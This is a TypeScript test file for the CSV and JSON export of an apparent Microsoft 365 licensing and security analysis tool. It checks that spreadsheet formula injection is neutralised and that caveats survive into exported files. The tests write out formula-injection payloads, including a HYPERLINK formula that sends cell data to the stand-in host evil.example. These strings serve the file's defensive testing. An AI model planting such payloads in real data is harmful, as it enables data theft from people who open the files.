/**
 * Getting the analysis out without losing what qualifies it.
 *
 * Two things are guarded here. That a spreadsheet cannot be turned into an attack by a
 * tenant display name, and that a figure carrying a caveat on screen still carries it in
 * the file, because the file is the copy that gets forwarded.
 */
import { describe, expect, it } from 'vitest';

import premiumSnapshot from '@fixtures/premium-snapshot.json';

import { analyze } from './index';
import { escapeCsvField, toCsv } from './csv';
import { exportManifest, exportSections, toJsonExport } from './export';
import { catalog, cloneConfig, featureMap, listPriceList, riskModel } from '@/data/reference';
import { parseSnapshot } from '@/model/snapshot';

const model = (() => {
  const parsed = parseSnapshot(premiumSnapshot);
  if (!parsed.ok) throw new Error(parsed.reason);
  return analyze({
    snapshot: parsed.snapshot,
    config: cloneConfig(),
    catalog,
    priceList: listPriceList,
    featureMap,
    riskModel,
  });
})();

describe('a spreadsheet cannot be turned into an attack', () => {
  it('neutralises every character a spreadsheet reads as a formula', () => {
    // A tenant is exactly where an attacker can set a display name, and these files are
    // opened in Excel on the consultant's own machine.
    for (const payload of ['=1+1', '+1', '-1', '@SUM(A1)', '\tcmd', '\rcmd']) {
      expect(escapeCsvField(payload).startsWith("'")).toBe(true);
    }
  });

  it('neutralises the classic exfiltration payload', () => {
    const attack = '=HYPERLINK("http://evil.example/?d="&A1,"click")';
    const out = escapeCsvField(attack);
    expect(out.startsWith('"\'=')).toBe(true);
  });

  it('prefixes rather than strips, so a legitimate value survives', () => {
    // "-5" is a real number a reader needs to see, and a rule genuinely named "=SUM" must
    // still be identifiable. The apostrophe marks it as text without altering it.
    expect(escapeCsvField('-5')).toBe("'-5");
    expect(escapeCsvField('=SUM report')).toBe("'=SUM report");
  });

  it('carries the guard through the whole pipeline, not just the escaper', () => {
    // The unit tests above prove escapeCsvField works. This proves it is actually reached:
    // a display name set by an attacker in the tenant travels through collection, analysis
    // and the account breakdown, and still arrives as text.
    const parsed = parseSnapshot(premiumSnapshot);
    if (!parsed.ok) throw new Error(parsed.reason);
    const hostile = structuredClone(parsed.snapshot);
    for (const user of hostile.Collectors.users!.Data!) {
      user.DisplayName = '=HYPERLINK("http://evil.example/?d="&A1,"payroll")';
      user.UserPrincipalName = '@SUM(1+1)*cmd|calc';
    }

    const attacked = analyze({
      snapshot: hostile,
      config: cloneConfig(),
      catalog,
      priceList: listPriceList,
      featureMap,
      riskModel,
    });

    const accounts = exportSections(attacked).find((s) => s.id === 'wasted-spend-accounts');
    expect(accounts, 'the fixture must produce account rows for this to test anything').toBeTruthy();
    const rows = accounts!.csv().trim().split('\n').slice(1);
    expect(rows.length).toBeGreaterThan(0);

    for (const row of rows) {
      expect(row).toContain('evil.example');
      // No cell may begin with a character a spreadsheet evaluates. A quoted cell is
      // checked past its opening quote, which is where the payload would sit.
      for (const cell of row.split(',')) {
        expect(cell.replace(/^"/, '')).not.toMatch(/^[=+\-@\t\r]/);
      }
    }
  });

  it('leaves ordinary text alone', () => {
    expect(escapeCsvField('Microsoft 365 E5')).toBe('Microsoft 365 E5');
    expect(escapeCsvField(42)).toBe('42');
    expect(escapeCsvField(null)).toBe('');
  });

  it('quotes and escapes commas, quotes and newlines', () => {
    expect(escapeCsvField('a,b')).toBe('"a,b"');
    expect(escapeCsvField('say "hi"')).toBe('"say ""hi"""');
    // Newlines are flattened: remediation text is full of them and a row that spans
    // lines is unreadable in every tool that is not a spreadsheet.
    expect(escapeCsvField('one\ntwo')).toBe('one two');
  });

  it('produces a header and one line per row', () => {
    const csv = toCsv([{ a: 1 }, { a: 2 }], [{ header: 'A', value: (r) => r.a }]);
    expect(csv).toBe('A\n1\n2\n');
  });
});

describe('the export carries its own caveats', () => {
  const sections = exportSections(model);

  it('offers a sheet per audience question', () => {
    const ids = sections.map((s) => s.id);
    expect(ids).toContain('licence-inventory');
    expect(ids).toContain('entitled-versus-deployed');
    expect(ids).toContain('licence-rollup');
    expect(ids).toContain('wasted-spend');
    expect(ids).toContain('roadmap');
  });

  it('warns in the sheet itself that the per-control column is not additive', () => {
    const controls = sections.find((s) => s.id === 'entitled-versus-deployed')!;
    expect(controls.description).toMatch(/NOT additive/i);
  });

  it('labels the risk inputs as assumptions in the column headers', () => {
    // This sheet will be forwarded without the report around it, so the caveat has to
    // survive inside the file rather than beside it.
    const threats = sections.find((s) => s.id === 'threat-exposure');
    expect(threats).toBeTruthy();
    const header = threats!.csv().split('\n')[0]!;
    expect(header).toMatch(/assumption/i);
  });

  it('writes a README naming what is measured, supplied and assumed', () => {
    const readme = exportManifest(model, 'sample tenant', sections);
    expect(readme).toMatch(/WHAT IS MEASURED AND WHAT IS ASSUMED/);
    expect(readme).toMatch(/Microsoft Graph does not expose contract pricing/);
    expect(readme).toMatch(/NOT additive/);
    expect(readme).toMatch(/An empty cell means the figure could not be established/);
    for (const s of sections) expect(readme).toContain(`${s.id}.csv`);
  });

  it('says how much of the tenant the risk figure actually rests on', () => {
    // On a production tenant only 43 of 209 controls carried a threat tag. A board pack
    // quoting expected loss without that proportion is quoting a fifth of the tenant.
    const readme = exportManifest(model, 'x', sections);
    if (model.risk.controlsWithoutThreatTag > 0) {
      expect(readme).toMatch(/Risk rests on \d+ of \d+ scored controls/);
    }
  });

  it('keeps an unavailable figure empty rather than zero', () => {
    // Parsed by column rather than by substring: "no" also appears in the cost-is-a-floor
    // column, so a filter matching it tested nothing at all.
    const lines = sections
      .find((s) => s.id === 'wasted-spend')!
      .csv()
      .trim()
      .split('\n');
    const header = lines[0]!.split(',');
    const iMeasured = header.indexOf('Measured');
    const iSeats = header.indexOf('Seats');
    const iCost = header.indexOf('Annual cost');
    const iWhy = header.indexOf('Why not measured');

    const unmeasured = lines
      .slice(1)
      .map((l) => l.split(','))
      .filter((cells) => cells[iMeasured] === 'no');

    expect(unmeasured.length).toBeGreaterThan(0);
    for (const cells of unmeasured) {
      expect(cells[iSeats]).toBe('');
      expect(cells[iCost]).toBe('');
      // And it says why, so an empty cell is never mistaken for an oversight.
      expect(cells.slice(iWhy).join(',').length).toBeGreaterThan(0);
    }
  });
});

describe('the JSON export', () => {
  it('leads with what the reader must know before quoting a figure', () => {
    const json = toJsonExport(model, 'sample tenant') as Record<string, any>;
    expect(json.kind).toBe('m365-security-investment-report');
    expect(json.$readThisFirst.pricing).toMatch(/does not expose contract pricing/);
    expect(json.$readThisFirst.riskModel).toMatch(/assumptions/i);
    expect(json.$readThisFirst.notMeasured).toMatch(/rather than as zero/);
  });

  it('carries the whole model, so nothing needs re-collecting to answer a question', () => {
    const json = toJsonExport(model, 'x') as Record<string, any>;
    for (const key of ['tenant', 'inventory', 'spend', 'seatWaste', 'features', 'risk', 'roadmap', 'realization']) {
      expect(json[key], key).toBeTruthy();
    }
    expect(json.source.collectors.length).toBeGreaterThan(0);
  });

  it('survives a round trip through JSON', () => {
    const json = toJsonExport(model, 'x');
    expect(() => JSON.parse(JSON.stringify(json))).not.toThrow();
  });
});
